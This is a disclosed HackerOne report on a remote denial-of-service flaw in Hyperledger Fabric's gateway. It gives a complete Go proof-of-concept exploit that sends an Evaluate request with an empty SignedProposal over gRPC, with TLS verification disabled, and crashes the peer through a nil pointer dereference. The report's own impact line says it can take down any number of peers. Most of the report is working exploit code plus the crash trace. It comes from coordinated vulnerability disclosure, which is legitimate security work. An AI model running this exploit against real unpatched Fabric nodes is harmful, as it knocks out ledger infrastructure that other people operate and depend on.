# Remote denial of service in HyperLedger Fabric

## Report Details
- **Report ID**: 1635854
- **URL**: https://hackerone.com/reports/1635854
- **State**: Closed
- **Severity**: high
- **Submitted**: 2022-07-13T14:39:08.019Z
- **Disclosed**: 2022-09-01T14:05:00.956Z

## Reporter
- **Username**: fatal0
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: hyperledger

## Vulnerability Information
How to reproduce
1.Bring up the test network.(https://hyperledger-fabric.readthedocs.io/en/latest/test_network.html#bring-up-the-test-network)
2.Run the PoC.
```bash
go run poc.go -server=192.168.0.208:7051
```
```go
package main

import (
	"context"
	"crypto/tls"
	"flag"
	"fmt"

	"github.com/hyperledger/fabric-protos-go/gateway"
	"github.com/hyperledger/fabric-protos-go/peer"

	"google.golang.org/grpc"
	"google.golang.org/grpc/credentials"
)

func main() {

	var srv string
	flag.StringVar(&srv, "server", "localhost:7050", "The RPC server to connect to.")

	flag.Parse()

	config := &tls.Config{
		InsecureSkipVerify: true,
	}

	conn, err := grpc.Dial(srv, grpc.WithTransportCredentials(credentials.NewTLS(config)))
	
	defer func() {
		_ = conn.Close()
	}()

	if err != nil {
		fmt.Println("Error connecting:", err)
		return
	}


	payload := &gateway.EvaluateRequest{}


	payload.ProposedTransaction = &peer.SignedProposal{}



	resp, err := gateway.NewGatewayClient(conn).Evaluate(context.TODO(), payload)
	if err != nil {
		fmt.Println("Error connecting:", err)
		return
	}


	fmt.Println("resp:", resp)

}

```
3.Crash.
```log
panic: runtime error: invalid memory address or nil pointer dereference
[signal SIGSEGV: segmentation violation code=0x1 addr=0x8 pc=0x157d6c7]

goroutine 381927 [running]:
github.com/hyperledger/fabric/internal/pkg/gateway.getChannelAndChaincodeFromSignedProposal(0x0?)
        /go/src/github.com/hyperledger/fabric/internal/pkg/gateway/apiutils.go:49 +0xe7
github.com/hyperledger/fabric/internal/pkg/gateway.(*Server).Evaluate(0xc0001dd3e0, {0x1b55c58?, 0xc00359aa80}, 0xc003470600)
        /go/src/github.com/hyperledger/fabric/internal/pkg/gateway/api.go:43 +0x85
github.com/hyperledger/fabric-protos-go/gateway._Gateway_Evaluate_Handler.func1({0x1b55c58, 0xc00359aa80}, {0x18ed0a0?, 0xc003470600})
        /go/src/github.com/hyperledger/fabric/vendor/github.com/hyperledger/fabric-protos-go/gateway/gateway.pb.go:1176 +0x78
github.com/hyperledger/fabric/internal/peer/node.unaryGrpcLimiter.func1({0x1b55c58, 0xc00359aa80}, {0x18ed0a0, 0xc003470600}, 0x195a8d5?, 0xc003400210)
        /go/src/github.com/hyperledger/fabric/internal/peer/node/grpc_limiters.go:49 +0x38e
github.com/grpc-ecosystem/go-grpc-middleware.ChainUnaryServer.func1.1.1({0x1b55c58?, 0xc00359aa80?}, {0x18ed0a0?, 0xc003470600?})
        /go/src/github.com/hyperledger/fabric/vendor/github.com/grpc-ecosystem/go-grpc-middleware/chain.go:25 +0x3a
github.com/hyperledger/fabric/common/grpclogging.UnaryServerInterceptor.func1({0x1b55c58, 0xc00359a810}, {0x18ed0a0, 0xc003470600}, 0xc000308420, 0xc000308440)
        /go/src/github.com/hyperledger/fabric/common/grpclogging/server.go:92 +0x305
github.com/grpc-ecosystem/go-grpc-middleware.ChainUnaryServer.func1.1.1({0x1b55c58?, 0xc00359a810?}, {0x18ed0a0?, 0xc003470600?})
        /go/src/github.com/hyperledger/fabric/vendor/github.com/grpc-ecosystem/go-grpc-middleware/chain.go:25 +0x3a
github.com/hyperledger/fabric/common/grpcmetrics.UnaryServerInterceptor.func1({0x1b55c58, 0xc00359a810}, {0x18ed0a0, 0xc003470600}, 0x7f0fb3c94a38?, 0xc000308460)
        /go/src/github.com/hyperledger/fabric/common/grpcmetrics/interceptor.go:31 +0x17b
github.com/grpc-ecosystem/go-grpc-middleware.ChainUnaryServer.func1.1.1({0x1b55c58?, 0xc00359a810?}, {0x18ed0a0?, 0xc003470600?})
        /go/src/github.com/hyperledger/fabric/vendor/github.com/grpc-ecosystem/go-grpc-middleware/chain.go:25 +0x3a
github.com/grpc-ecosystem/go-grpc-middleware.ChainUnaryServer.func1({0x1b55c58, 0xc00359a810}, {0x18ed0a0, 0xc003470600}, 0xc000521ae0?, 0x17ab820?)
        /go/src/github.com/hyperledger/fabric/vendor/github.com/grpc-ecosystem/go-grpc-middleware/chain.go:34 +0xbf
github.com/hyperledger/fabric-protos-go/gateway._Gateway_Evaluate_Handler({0x189b040?, 0xc0001dd3e0}, {0x1b55c58, 0xc00359a810}, 0xc0034705a0, 0xc0001f0720)
        /go/src/github.com/hyperledger/fabric/vendor/github.com/hyperledger/fabric-protos-go/gateway/gateway.pb.go:1178 +0x138
google.golang.org/grpc.(*Server).processUnaryRPC(0xc0006a2e00, {0x1b5a950, 0xc0002f4480}, 0xc00321e100, 0xc00045a780, 0x2398808, 0xc00357a740)
        /go/src/github.com/hyperledger/fabric/vendor/google.golang.org/grpc/server.go:1180 +0xc8f
google.golang.org/grpc.(*Server).handleStream(0xc0006a2e00, {0x1b5a950, 0xc0002f4480}, 0xc00321e100, 0xc00357a740)
        /go/src/github.com/hyperledger/fabric/vendor/google.golang.org/grpc/server.go:1503 +0xa1b
google.golang.org/grpc.(*Server).serveStreams.func1.2()
        /go/src/github.com/hyperledger/fabric/vendor/google.golang.org/grpc/server.go:843 +0x98
created by google.golang.org/grpc.(*Server).serveStreams.func1
        /go/src/github.com/hyperledger/fabric/vendor/google.golang.org/grpc/server.go:841 +0x28a
```

## Impact

It can easily break down as many peers as the attacker wants.

## Attachments
No attachments
